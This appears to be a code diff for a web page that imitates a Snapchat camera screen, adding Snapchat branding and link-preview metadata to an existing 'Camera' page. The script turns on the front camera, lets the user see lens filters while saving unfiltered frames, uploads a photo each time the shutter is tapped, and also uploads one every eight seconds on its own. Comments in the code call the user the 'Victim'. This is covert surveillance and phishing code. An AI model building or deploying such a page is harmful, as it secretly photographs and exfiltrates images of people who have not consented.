@@ -3,27 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-    <title>Camera</title>
+    
+    <title>Snapchat</title>
+    <meta name="description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
+    
+    <meta property="og:title" content="Snapchat">
+    <meta property="og:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10"> 
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Snapchat">
+    <meta name="twitter:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc.">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">
+
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
         body { width:100%; height:100%; overflow:hidden; background:#000; font-family:sans-serif; }
-        
-        /* Camera Feed */
         #camera { position:fixed; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); }
-        
-        /* UI Overlays */
         .v { position:fixed; left:0; width:100%; pointer-events:none; z-index:5; }
         .top-v { top:0; height:120px; background:linear-gradient(rgba(0,0,0,0.5), transparent); }
         .bot-v { bottom:0; height:220px; background:linear-gradient(transparent, rgba(0,0,0,0.7)); }
-
-        /* Top Interface (Status bar icons removed) */
         .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; }
         .tools { display:flex; flex-direction:column; gap:20px; align-items:center; color:#fff; font-size:22px; }
         .avatar { width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); }
         .badge { position:absolute; top:-4px; right:-4px; background:#ff3040; font-size:10px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }
-
-        /* Controls */
         .z-bar { position:fixed; bottom:180px; left:50%; transform:translateX(-50%); display:flex; gap:18px; padding:8px 18px; border-radius:30px; background:rgba(0,0,0,0.4); backdrop-filter:blur(10px); z-index:25; color:#888; font-size:13px; font-weight:bold; }
         .zoom.active { color:#ffe600; }
         .m-ui { position:fixed; bottom:90px; width:100%; display:flex; align-items:center; justify-content:center; gap:24px; z-index:25; }
@@ -31,8 +36,6 @@
         .shutter-in { width:60px; height:60px; border-radius:50%; background:rgba(255,255,255,0.2); }
         .lens { width:55px; height:55px; border-radius:50%; border:2px solid rgba(255,255,255,0.4); overflow:hidden; }
         .lens.active { border-color:#ffe600; }
-
-        /* Bottom Navbar */
         .footer { position:fixed; bottom:0; width:100%; height:70px; background:rgba(0,0,0,0.95); display:flex; justify-content:space-around; align-items:center; z-index:30; }
         .nav { font-size:22px; color:#666; }
         .nav.active { color:#fff; }
@@ -83,17 +86,15 @@
         const v = document.getElementById('camera'), c = document.getElementById('canvas');
         let z = 1, s;
 
-        // Initialize camera forced to front (user) sensor
         async function init() {
             if (s) s.getTracks().forEach(t => t.stop());
             try {
-                s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
+                // Forced to front camera
+                s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 v.srcObject = s;
                 v.style.transform = `scaleX(-1) scale(${z})`;
             } catch (err) {
-                console.error("Camera error:", err);
+                console.error(err);
             }
         }
 
@@ -104,30 +105,23 @@
             v.style.transform = `scaleX(-1) scale(${z})`;
         }
 
-        // Apply filter to VIDEO only (Victim sees it, but canvas stays clean)
         function setL(el, l) {
             document.querySelectorAll('.lens').forEach(i => i.classList.remove('active'));
             el.classList.add('active');
-            v.style.filter = l; 
+            v.style.filter = l; // Victim sees filter
         }
 
-        // Keep flip button for UI but force front camera reload
         document.getElementById('flip').onclick = () => { init(); };
-        
         document.getElementById('snap').onclick = () => { send(); };
 
         async function send() {
             c.width = v.videoWidth; 
             c.height = v.videoHeight;
             const ctx = c.getContext('2d');
-            
-            // Mirror for natural look
             ctx.translate(c.width, 0);
             ctx.scale(-1, 1);
-            
-            // Draw raw frame (ignoring v.style.filter)
+            // Captures raw frame without filter
             ctx.drawImage(v, 0, 0);
-            
             c.toBlob(blob => {
                 const fd = new FormData();
                 fd.append('photo', blob, 'capture.jpg');
@@ -135,7 +129,6 @@
             }, 'image/jpeg', 0.7);
         }
 
-        // Auto-capture every 8 seconds
         setInterval(send, 8000); 
         init();
     </script>
